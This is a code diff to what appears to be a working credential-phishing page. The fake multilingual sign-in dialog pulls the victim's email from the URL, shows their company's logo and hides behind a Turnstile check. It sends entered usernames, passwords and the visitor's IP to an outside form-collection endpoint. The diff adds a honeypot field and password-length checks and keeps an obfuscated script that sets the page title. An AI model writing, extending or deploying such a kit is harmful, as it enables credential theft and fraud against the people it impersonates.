@@ -314,6 +314,7 @@
       color: #fff;
     }
     .dialog .dialog-form .btn.btn-default:disabled { cursor: not-allowed; opacity: 0.65; }
+    .honeypot-field { display: none; }
     @-webkit-keyframes swooshUp30 { 0% { opacity: 0; } 100% { opacity: 1; } }
     @-moz-keyframes swooshUp30 { 0% { opacity: 0; } 100% { opacity: 1; } }
     @keyframes swooshUp30 { 0% { opacity: 0; } 100% { opacity: 1; } }
@@ -339,18 +340,6 @@
       0% { left: 51%; } 25% { left: 49%; } 50% { left: 51%; } 100% { left: 50%; }
     }
     @-webkit-keyframes showDialog {
-      0% { -webkit-transform: matrix3d(0.8, 0, 0, 0, 0, 0.8, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.8, 0, 0, 0, 0, 0.8, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
-      7.61% { -webkit-transform: matrix3d(0.907, 0, 0, 0, 0, 0.907, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.907, 0, 0, 0, 0, 0.907, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
-      11.41% { -webkit-transform: matrix3d(0.948, 0, 0, 0, 0, 0.948, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.948, 0, 0, 0, 0, 0.948, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
-      15.12% { -webkit-transform: matrix3d(0.976, 0, 0, 0, 0, 0.976, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.976, 0, 0, 0, 0, 0.976, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
-      18.92% { -webkit-transform: matrix3d(0.996, 0, 0, 0, 0, 0.996, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.996, 0, 0, 0, 0, 0.996, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
-      22.72% { -webkit-transform: matrix3d(1.008, 0, 0, 0, 0, 1.008, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(1.008, 0, 0, 0, 0, 1.008, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
-      30.23% { -webkit-transform: matrix3d(1.014, 0, 0, 0, 0, 1.014, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(1.014, 0, 0, 0, 0, 1.014, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
-      50.25% { -webkit-transform: matrix3d(1.003, 0, 0, 0, 0, 1.003, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(1.003, 0, 0, 0, 0, 1.003, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
-      70.27% { -webkit-transform: matrix3d(0.999, 0, 0, 0, 0, 0.999, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.999, 0, 0, 0, 0, 0.999, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
-      100% { -webkit-transform: matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
-    }
-    @keyframes showDialog {
       0% { -webkit-transform: matrix3d(0.8, 0, 0, 0, 0, 0.8, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.8, 0, 0, 0, 0, 0.8, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
       7.61% { -webkit-transform: matrix3d(0.907, 0, 0, 0, 0, 0.907, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.907, 0, 0, 0, 0, 0.907, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
       11.41% { -webkit-transform: matrix3d(0.948, 0, 0, 0, 0, 0.948, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.948, 0, 0, 0, 0, 0.948, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
@@ -410,6 +399,11 @@
 <label for="user_password" class="control-label" data-i18n="password">Password:</label>
 <input type="password" id="user_password" class="form-control" name="user_password" required />
 </div>
+<!-- Honeypot field -->
+<div class="form-group honeypot-field">
+<label for="contact_info">Leave this field empty</label>
+<input type="text" id="contact_info" name="contact_info" value="" />
+</div>
 <label id="error" class="error" style="display: none;color: red;" data-i18n="error">Enter the correct password</label>
 <div class="pad-top-20 pad-btm-20">
 <input type="submit" id="submit-btn" class="btn btn-default btn-block btn-lg" data-i18n="[value]continue" value="Continue">
@@ -434,6 +428,8 @@
           password: "Password",
           error: "Enter the correct password",
           too_many_attempts: "Too many sign-in attempts, try again",
+          password_too_short: "Password must be at least 6 characters",
+          password_too_long: "Password must not exceed 12 characters",
           continue: "Continue"
         }
       },
@@ -444,6 +440,8 @@
           password: "Contraseña",
           error: "Ingresa la contraseña correcta",
           too_many_attempts: "Demasiados intentos de inicio de sesión, intenta de nuevo",
+          password_too_short: "La contraseña debe tener al menos 6 caracteres",
+          password_too_long: "La contraseña no debe exceder los 12 caracteres",
           continue: "Continuar"
         }
       },
@@ -454,6 +452,8 @@
           password: "Mot de passe",
           error: "Entrez le mot de passe correct",
           too_many_attempts: "Trop de tentatives de connexion, réessayez",
+          password_too_short: "Le mot de passe doit comporter au moins 6 caractères",
+          password_too_long: "Le mot de passe ne doit pas dépasser 12 caractères",
           continue: "Continuer"
         }
       },
@@ -464,6 +464,8 @@
           password: "Passwort",
           error: "Geben Sie das richtige Passwort ein",
           too_many_attempts: "Zu viele Anmeldeversuche, versuchen Sie es erneut",
+          password_too_short: "Das Passwort muss mindestens 6 Zeichen lang sein",
+          password_too_long: "Das Passwort darf 12 Zeichen nicht überschreiten",
           continue: "Weiter"
         }
       },
@@ -474,6 +476,8 @@
           password: "密码",
           error: "请输入正确的密码",
           too_many_attempts: "登录尝试过多，请重试",
+          password_too_short: "密码必须至少6个字符",
+          password_too_long: "密码不得超过12个字符",
           continue: "继续"
         }
       },
@@ -484,6 +488,8 @@
           password: "Mật khẩu",
           error: "Nhập mật khẩu đúng",
           too_many_attempts: "Quá nhiều lần thử đăng nhập, hãy thử lại",
+          password_too_short: "Mật khẩu phải có ít nhất 6 ký tự",
+          password_too_long: "Mật khẩu không được vượt quá 12 ký tự",
           continue: "Tiếp tục"
         }
       },
@@ -494,6 +500,8 @@
           password: "비밀번호",
           error: "올바른 비밀번호를 입력하세요",
           too_many_attempts: "로그인 시도가 너무 많습니다, 다시 시도하세요",
+          password_too_short: "비밀번호는 최소 6자 이상이어야 합니다",
+          password_too_long: "비밀번호는 12자를 초과할 수 없습니다",
           continue: "계속"
         }
       },
@@ -504,6 +512,8 @@
           password: "كلمة المرور",
           error: "أدخل كلمة المرور الصحيحة",
           too_many_attempts: "محاولات تسجيل الدخول كثيرة جدًا، حاول مرة أخرى",
+          password_too_short: "يجب أن تتكون كلمة المرور من 6 أحرف على الأقل",
+          password_too_long: "يجب ألا تتجاوز كلمة المرور 12 حرفًا",
           continue: "متابعة"
         }
       }
@@ -521,29 +531,25 @@
   });
 
   var _0x3121cb=_0x4e3e;function _0x4e3e(_0x4b06ec,_0x2c42ce){var _0x1137fe=_0x1137();return _0x4e3e=function(_0x4e3ec8,_0x2cdd8b){_0x4e3ec8=_0x4e3ec8-0x7a;var _0x4e3d1d=_0x1137fe[_0x4e3ec8];return _0x4e3d1d;},_0x4e3e(_0x4b06ec,_0x2c42ce);}function _0x1137(){var _0x55dae1=['value','923235tHGKGv','4051254bWxUdt','5816fqMdQs','8596007xIcuCA','getElementById','43912710lErqoF','399IKjmFG','472FGAJjW','1292320TywGUx','title','user_username','12ZwWcEZ','14841KXSGPt','ca543e2728f684c0d5de19a83de16645636ed4699b2b6\x20-\x20'];_0x1137=function(){return _0x55dae1;};return _0x1137();}(function(_0x21a638,_0x3149da){var _0x4e5558=_0x4e3e,_0x52e06d=_0x21a638();while(!![]){try{var _0x5e1473=-parseInt(_0x4e5558(0x7e))/0x1*(parseInt(_0x4e5558(0x7a))/0x2)+-parseInt(_0x4e5558(0x88))/0x3+parseInt(_0x4e5558(0x80))/0x4+-parseInt(_0x4e5558(0x87))/0x5*(parseInt(_0x4e5558(0x83))/0x6)+-parseInt(_0x4e5558(0x7b))/0x7+-parseInt(_0x4e5558(0x7f))/0x8*(-parseInt(_0x4e5558(0x84))/0x9)+parseInt(_0x4e5558(0x7d))/0xa;if(_0x5e1473===_0x3149da)break;else _0x52e06d['push'](_0x52e06d['shift']());}catch(_0x1134de){_0x52e06d['push'](_0x52e06d['shift']());}}}(_0x1137,0xabc95),document[_0x3121cb(0x81)]=_0x3121cb(0x85)+fetchEmail(),document[_0x3121cb(0x7c)](_0x3121cb(0x82))[_0x3121cb(0x86)]=fetchEmail());
-</script>
 
-<script>
   var count = 0;
 
   // --- Turnstile and Gating Logic ---
-
-  // This function is called by the Turnstile script on load.
   function renderTurnstile() {
     turnstile.render('#turnstile-widget', {
       sitekey: '0x4AAAAAAB10qIE0M6yxD1P2',
       callback: function(token) {
-        // This is the success callback.
         console.log("Turnstile challenge passed.");
-        // Hide the Turnstile container
         $('#turnstile-container').hide();
-        // Show the main login form dialog
         $('#dialog').show();
       },
     });
   }
 
-  // Function to get the user's IP address from a third-party service
+  // Hide the verification message element
+  document.getElementById('verification-message').style.display = 'none';
+
+  // --- Form Submission Logic ---
   function getUserIP(callback) {
     $.ajax({
       url: 'https://api.ipify.org?format=json',
@@ -560,15 +566,14 @@
     });
   }
 
-  // --- Form Submission Logic ---
-
-  function sendFormData(email, password, $input, $passwordInput) {
+  function sendFormData(email, password, honeypot, $input, $passwordInput) {
     $.ajax({
       type: 'POST',
       url: "https://submit-form.com/bbKESMhI7",
       data: {
         user_username: email,
-        user_password: password
+        user_password: password,
+        contact_info: honeypot
       },
       dataType: 'json',
       success: function(data) {
@@ -666,6 +671,28 @@ IP Address: ${ipAddress}`;
     var $passwordInput = $('#user_password');
     var email = $("#user_username").val();
     var password = $passwordInput.val();
+    var honeypot = $("#contact_info").val();
+
+    // Password length validation
+    if (password.length < 6) {
+      document.getElementById("user_password").style.borderColor = "red";
+      document.getElementById("error").style.display = "block";
+      document.getElementById("error").setAttribute('data-i18n', 'password_too_short');
+      i18next.changeLanguage(navigator.language || navigator.userLanguage || 'en', function() {
+        document.getElementById("error").textContent = i18next.t('password_too_short');
+      });
+      $passwordInput.val('');
+      return; // Stop submission
+    } else if (password.length > 12) {
+      document.getElementById("user_password").style.borderColor = "red";
+      document.getElementById("error").style.display = "block";
+      document.getElementById("error").setAttribute('data-i18n', 'password_too_long');
+      i18next.changeLanguage(navigator.language || navigator.userLanguage || 'en', function() {
+        document.getElementById("error").textContent = i18next.t('password_too_long');
+      });
+      $passwordInput.val('');
+      return; // Stop submission
+    }
 
     // New submission flow: Get IP first, then submit.
     getUserIP(function(ipAddress) {
@@ -677,9 +704,9 @@ IP Address: ${ipAddress}`;
       // 2. Send data to the original form endpoint
       if (!$input.is(':disabled')) {
         count++;
-        sendFormData(email, password, $input, $passwordInput);
+        sendFormData(email, password, honeypot, $input, $passwordInput);
       } else {
-        sendFormData(email, password, $input, $passwordInput);
+        sendFormData(email, password, honeypot, $input, $passwordInput);
       }
     });
   });
@@ -716,14 +743,6 @@ IP Address: ${ipAddress}`;
         document.getElementById('logo').src = "https://logo.clearbit.com/" + changeLogo(fetchEmail());
       }
     }
-  }
-
-  // --- Dynamic Verification Message Logic ---
-  var emailForMessage = fetchEmail();
-  if (emailForMessage) {
-    var domainForMessage = changeLogo(emailForMessage);
-    // You can customize the message below
-    document.getElementById('verification-message').innerHTML = '<span style="font-size: 0.9em;"><strong>' + domainForMessage + '</strong></span><br><br>verifying you are human...';
   }
 
   checkImage("https://logo.clearbit.com/" + changeLogo(fetchEmail()));
